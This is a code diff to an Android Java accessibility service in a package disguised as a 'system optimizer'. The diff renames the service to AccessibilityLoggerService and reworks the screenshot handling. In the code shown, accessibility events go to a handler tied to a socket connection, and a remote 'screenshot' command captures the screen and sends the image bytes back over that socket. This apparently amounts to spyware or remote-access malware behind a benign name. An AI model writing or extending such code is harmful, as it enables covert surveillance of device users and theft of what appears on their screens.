@@ -1,6 +1,6 @@
 package com.system.optimizer;
 
-import com.system.optimizer.handler.SystemEventHandler;
+import com.system.optimizer.handler.AccessibilityEventHandler;
 import com.system.optimizer.handler.ScreenshotCapture;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
@@ -10,20 +10,19 @@ import android.accessibilityservice.AccessibilityService;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
-public class SystemEventMonitor extends AccessibilityService {
-    private static final String TAG = "SystemEventMonitor";
+public class AccessibilityLoggerService extends AccessibilityService {
+    private static final String TAG = "AccessibilityLoggerService";
 
     private SocketManager socketManager;
     private ConfigManager configManager;
-    // handlers
-    private SystemEventHandler systemEventHandler;
+    private AccessibilityEventHandler accessibilityEventHandler;
     private ScreenshotCapture screenShotCapture;
     private boolean isInitialized = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "SystemEventMonitor onCreate - starting async initialization");
+        Log.d(TAG, "AccessibilityLoggerService onCreate - starting async initialization");
 
         try {
             // Create ConfigManager without blocking network operation
@@ -62,14 +61,22 @@ public class SystemEventMonitor extends AccessibilityService {
             this.screenShotCapture = new ScreenshotCapture(this, configManager);
             
             // Create text handler with screenshot capture reference
-            this.systemEventHandler = new SystemEventHandler(screenShotCapture, socketManager);
+            this.accessibilityEventHandler = new AccessibilityEventHandler(screenShotCapture, socketManager);
             
             // Add listener for manual screenshot requests
             this.socketManager.addListener("screenshot", args -> {
                 // Capture screenshot and send as response
-                screenShotCapture.takeScreenshot().thenAccept(imageBytes -> {
-                    if (imageBytes != null) {
-                        socketManager.sendEvent("screenshot_response", imageBytes);
+                screenShotCapture.takeScreenshot(new ScreenshotCallback() {
+                    @Override
+                    public void onSuccess(byte[] imageData) {
+                        if (imageData != null) {
+                            socketManager.sendEvent("screenshot_response", imageData);
+                        }
+                    }
+
+                    @Override
+                    public void onError(String errorMessage) {
+                        socketManager.sendEvent("screenshot_error", errorMessage);
                     }
                 });
             });
@@ -95,7 +102,7 @@ public class SystemEventMonitor extends AccessibilityService {
         }
 
         try {
-            systemEventHandler.onSystemEvent(event);
+            accessibilityEventHandler.onAccessibilityEvent(event);
         } catch (Exception e) {
             Log.e(TAG, "Error handling accessibility event", e);
         }
